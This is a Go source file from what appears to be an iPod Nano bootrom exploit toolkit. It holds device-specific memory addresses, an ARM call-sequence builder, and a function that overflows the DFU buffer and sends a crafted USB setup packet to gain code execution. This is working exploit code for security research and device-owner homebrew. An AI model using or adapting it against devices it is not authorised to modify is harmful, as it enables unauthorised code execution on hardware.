package exploit

import (
	"bytes"
	"fmt"
	"time"

	"github.com/freemyipod/wInd3x/pkg/devices"
	"github.com/freemyipod/wInd3x/pkg/dfu"
	"github.com/freemyipod/wInd3x/pkg/uasm"

	"github.com/google/gousb"
)

type Parameters interface {
	// Prepare runs any code required to run the main exploit. This is needed
	// for chaining from S5Late on N6G/N7G.
	Prepare(usb *gousb.Device) error

	// Address of the DFU data buffer.
	DFUBufAddr() uint32
	// Address at which payload begins execution, within the DFU data buffer,
	// as jumped into by the SetupPacket.
	ExecAddr() uint32
	// Address of the USB DMA buffer, ie. the SETUP packet currently being
	// processed.
	USBBufAddr() uint32
	// Address of trampoline in bootrom, jumped to by handler.
	TrampolineAddr() uint16
	// Setup packet to be sent. This must also be valid ARM code, as it happens
	// to be executed.
	SetupPacket() []byte

	HandlerFooter(addr uint32) []uasm.Statement
	AESCall() []uasm.Statement
	HaxedDFUPayload() []uasm.Statement
	DisableICache() []uasm.Statement

	NANDInit(bank uint32) ([]uasm.Statement, error)
	NANDReadPage(bank, page, offset uint32) ([]uasm.Statement, uint32)

	NORInit(spino uint32) ([]uasm.Statement, error)
	NORRead(spino uint32, offset uint32) ([]uasm.Statement, uint32)
}

func ldrOrMov(r uasm.Register, val uint32) uasm.Statement {
	// This could probably be higher, but I've had some issues with this.
	// TODO: verify against ARM spec.
	if val >= 1<<8 {
		return uasm.Ldr{Dest: r, Src: uasm.Constant(val)}
	}
	return uasm.Mov{Dest: r, Src: uasm.Immediate(val)}
}

func makeCall(addr uint32, params ...uint32) []uasm.Statement {
	var stackParams []uint32
	if len(params) > 4 {
		stackParams = params[4:]
	}

	var res []uasm.Statement

	if len(params) > 4 {
		// Make space on stack.
		stackFrame := len(stackParams) * 4
		res = append(res,
			uasm.Sub{Dest: uasm.SP, Src: uasm.SP, Compl: uasm.Immediate(stackFrame)},
		)
		// Set stack params.
		for i := len(stackParams) - 1; i >= 0; i-- {
			offs := 4 * uint16(i)
			res = append(res,
				ldrOrMov(uasm.R0, stackParams[i]),
				uasm.Str{Src: uasm.R0, Dest: uasm.Deref(uasm.SP, offs)},
			)
		}
	}
	// Set register params.
	for i := 0; i < 4; i++ {
		if i >= len(params) {
			break
		}
		res = append(res,
			ldrOrMov(uasm.Register(i), params[i]),
		)
	}
	// Perform call.
	res = append(res,
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(addr)},
		uasm.Blx{Dest: uasm.LR},
	)

	if len(params) > 4 {
		// Clean up stack.
		stackFrame := len(stackParams) * 4
		res = append(res,
			uasm.Add{Dest: uasm.SP, Src: uasm.SP, Compl: uasm.Immediate(stackFrame)},
		)
	}

	return res
}

var ParametersForKind = map[devices.Kind]Parameters{
	devices.Nano3: &epNano3G{},
	devices.Nano4: newEPNano4G(),
	devices.Nano5: newEPNano5G(),
	devices.Nano7: S5LateParametersForKind[devices.Nano7],
}

func RCE(usb *gousb.Device, ep Parameters, payload, data []byte) ([]byte, error) {
	usb.ControlTimeout = time.Millisecond * 50

	prefixLen := int(ep.ExecAddr() - ep.DFUBufAddr())
	if len(data) > prefixLen {
		return nil, fmt.Errorf("data too long")
	}
	pad := bytes.Repeat([]byte{'Z'}, prefixLen-len(data))
	data = append(data, pad...)
	payload = append(data, payload...)

	// Upload payload into DFU buffer, and reset status afterwards.
	if len(payload) > 0x400 {
		return nil, fmt.Errorf("payload too large (%d > %d)", len(payload), 0x400)
	}
	if err := dfu.SendChunk(usb, payload, 0); err != nil {
		return nil, fmt.Errorf("Upload: %w", err)
	}
	if err := dfu.Clean(usb); err != nil {
		return nil, fmt.Errorf("clean: %w", err)
	}

	buf := make([]byte, 0x40)
	if _, err := usb.Control(0xa1, uint8(dfu.RequestUpload), 0, 0, buf); err != nil {
		return nil, fmt.Errorf("first upload failed: %v", err)
	}

	if ep.TrampolineAddr() != 0 {
		// Start a download of X+0x40 bytes, this will only send 0x40 bytes
		// (for some reason large control transfers don't work?), causing a state
		// structure field to be set to X.
		// X = TrampolineAddr, which is 0x3b0 for Nano 4G and 0x37c for Nano 5G
		l := ep.TrampolineAddr() + 0x40
		buf = make([]byte, l)
		_, err := usb.Control(0xa1, uint8(dfu.RequestUpload), 0, 0, buf)
		if want, got := gousb.ErrorTimeout, err; want != got {
			return nil, fmt.Errorf("upload trigger should have returned %v, got %v", want, got)
		}
	}

	// Trigger bug. This should get the payload executing.
	setup := ep.SetupPacket()
	bmRequestType := setup[0]
	bRequest := setup[1]
	wValue := uint16(setup[2]) | (uint16(setup[3]) << 8)
	wIndex := uint16(setup[4]) | (uint16(setup[5]) << 8)
	res := make([]byte, 0x40)
	_, err := usb.Control(bmRequestType, bRequest, wValue, wIndex, res)
	if err != nil {
		return nil, fmt.Errorf("bug trigger: %w", err)
	}

	return res, nil

}
